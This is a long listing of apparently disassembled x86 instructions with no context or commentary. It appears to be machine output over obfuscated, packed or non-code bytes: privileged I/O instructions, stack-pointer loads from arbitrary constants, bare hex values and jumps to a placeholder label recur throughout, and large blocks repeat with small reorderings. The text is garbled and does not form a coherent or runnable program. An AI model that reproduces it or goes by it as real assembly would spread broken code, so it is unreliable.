mov ebx 0x5a10ff74
jpo r-xdata
jpo r-xdata
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
xchg ebx eax
jpo r-xdata
and eax 0x137b7b3a
jpo r-xdata
dec eax
test [ eax ] ch
cmp al 0x92
jmp r-xdata
sub [ edi + ecx + 0x2d84635f ] al
setae [ ecx - 0x77 ]
test [ esi + edi * 8 + 0x5afe74bb ] al
lea eax [ esp + eax * 4 - 0x72916dd8 ]
test [ ebx + ebp * 8 - 0x3dd51415 ] al
dec ebx
jpo r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
sbb eax 0x92c306f2
0x7b47
jmp r-xdata
sub eax 0x775b9236
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov al [ esp + eax * 4 - 0x8b1415 ]
jpo r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
push es
retn
or [ edx + 0x7b ] al
jpo r-xdata
jmp sub_47848e
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
test bl ch
sbb eax 0x1d873ef2
mov eax [ 0xffffffff92bdf02b ]
0xeb7b7b41 0x401d
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
pop edi
aaa
sub al 0x92
xlat
r-xdata
aas
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
lea esp [ edx ]
inc esi
push ebp
jpo r-xdata
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
jmp r-xdata
and al 0x25
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
jmp r-xdata
je r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
xchg edx eax
cmp eax 0xeb848488
cli
jo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_478362
test [ edi + edx * 2 ] ch
mov bl 0x92
cmp [ ebx + edi * 2 + 0x7b ] edx
jmp sub_4783da
jpo r-xdata
jmp r-xdata
mov eax 0xebebebeb
jmp r-xdata
mov ebx 0x3ef22c2d
xor edx 0x3e
pop edi
jae r-xdata
test dh bh
mov ebx 0x8d5afe74
test [ eax + ebp - 0x7b72916e ] al
test bl ch
jmp r-xdata
adc [ ebx - 0x7c ] edi
in al dx
xlat
jpo r-xdata
sub al 0x57
jno r-xdata
je r-xdata
test [ esi + edi * 8 + 0x5afe74bb ] al
lea eax [ esp + eax * 4 - 0x72916dd8 ]
test [ ebx + ebp * 8 - 0x3dd51415 ] al
dec ebx
jpo r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
xchg edx eax
pop ecx
jpo r-xdata
mov al [ esp + eax * 4 - 0x8b1415 ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
aas
pop edi
aaa
sub al 0x92
xlat
r-xdata
jo r-xdata
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
je r-xdata
jmp r-xdata
jpo r-xdata
cli
jpo r-xdata
jmp r-xdata
xchg edx eax
je r-xdata
jmp r-xdata
out 0x6c al
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
push ecx
jpo r-xdata
xchg [ 0x228d36f2 ] ebx
jmp r-xdata
daa
pop edx
jmp r-xdata
[ edx + 0x7b7b5677 ] 0xffffffeb
jmp r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
jl r-xdata
and bh dh
mov ebx 0x5a10ff74
jpo r-xdata
jpo r-xdata
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
jpo r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
xchg ebx eax
jpo r-xdata
and eax 0x137b7b3a
jpo r-xdata
dec eax
test [ eax ] ch
cmp al 0x92
jmp r-xdata
sub [ edi + ecx + 0x2d84635f ] al
setae [ ecx - 0x77 ]
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
sbb eax 0x92c306f2
0x7b47
jmp r-xdata
sub eax 0x775b9236
jpo r-xdata
jpo r-xdata
jmp r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
push es
retn
or [ edx + 0x7b ] al
jpo r-xdata
jmp sub_47848e
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
test bl ch
sbb eax 0x1d873ef2
mov eax [ 0xffffffff92bdf02b ]
0xeb7b7b41 0x401d
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
lea esp [ edx ]
inc esi
push ebp
jpo r-xdata
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
jmp r-xdata
and al 0x25
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
jmp r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
xchg edx eax
cmp eax 0xeb848488
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_478377
xchg edx eax
pop ebp
mov al [ esp + eax * 4 - 0x8b1415 ]
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
cli
jo r-xdata
sub_478395
outsd
jpo r-xdata
xchg ebx eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
daa
sub esi eax
mov ebp 0x7b6fd393
jmp r-xdata
jmp r-xdata
je r-xdata
jmp j_sub_4783e0
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx esi
mov ebx 0x3ef22c2d
xor edx 0x3e
jpo r-xdata
xchg edi eax
xor [ ss : 0x775b9236 ] ch
jpo r-xdata
inc edx
add [ esp + eax * 4 + 0x3992b3f0 ] 0xeb7b7b54
jmp sub_4783db
xchg edx eax
je r-xdata
jmp r-xdata
or [ edx + 0x7b ] al
jpo r-xdata
jmp sub_47848e
jpo r-xdata
jpo r-xdata
lea esp [ edx ]
inc esi
push ebp
jpo r-xdata
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
xchg [ 0x228d36f2 ] ebx
jmp r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
jmp r-xdata
jmp r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
xchg edx eax
cmp eax 0xeb848488
jl r-xdata
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
xchg ebx eax
jpo r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
sbb eax 0x92c306f2
0x7b47
jmp r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
push es
retn
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
and al 0x25
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_4783ba
inc [ eax + esi * 2 - 0x44b78485 ]
xchg edx eax
cmp [ eax + 0x7b ] bl
jpo r-xdata
daa
pop edx
jmp r-xdata
xchg edx eax
je r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg [ 0x228d36f2 ] ebx
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
jmp r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
jl r-xdata
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
xchg ebx eax
jpo r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
sbb eax 0x92c306f2
0x7b47
jmp r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
push es
retn
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
jmp r-xdata
and al 0x25
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_4783cc
jmp r-xdata
je r-xdata
test [ eax + 0x7b ] dh
jpo r-xdata
mov ebx 0x3ef22c2d
xor edx 0x3e
mov ebx 0x7b583892
jpo r-xdata
daa
pop edx
jmp r-xdata
xchg edx eax
je r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg [ 0x228d36f2 ] ebx
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
jmp r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
jl r-xdata
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
xchg ebx eax
jpo r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
sbb eax 0x92c306f2
0x7b47
jmp r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
push es
retn
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
jmp r-xdata
and al 0x25
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_4783da
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
je r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg [ 0x228d36f2 ] ebx
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
jmp r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
jl r-xdata
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
xchg ebx eax
jpo r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
sbb eax 0x92c306f2
0x7b47
jmp r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
push es
retn
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
jmp r-xdata
and al 0x25
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_4783db
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
and bh dh
mov ebx 0x5a10ff74
jpo r-xdata
and eax 0x137b7b3a
jpo r-xdata
dec eax
test [ eax ] ch
cmp al 0x92
daa
pop edx
sub eax 0x775b9236
jpo r-xdata
jpo r-xdata
xchg edx eax
je r-xdata
jmp r-xdata
or [ edx + 0x7b ] al
jpo r-xdata
jmp sub_47848e
test bl ch
sbb eax 0x1d873ef2
jpo r-xdata
jpo r-xdata
lea esp [ edx ]
inc esi
push ebp
jpo r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
xchg [ 0x228d36f2 ] ebx
jmp r-xdata
jmp r-xdata
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
jmp r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
cmp eax 0xeb848488
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
jl r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
xchg ebx eax
jpo r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
sbb eax 0x92c306f2
0x7b47
jmp r-xdata
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
push es
retn
xchg ebx eax
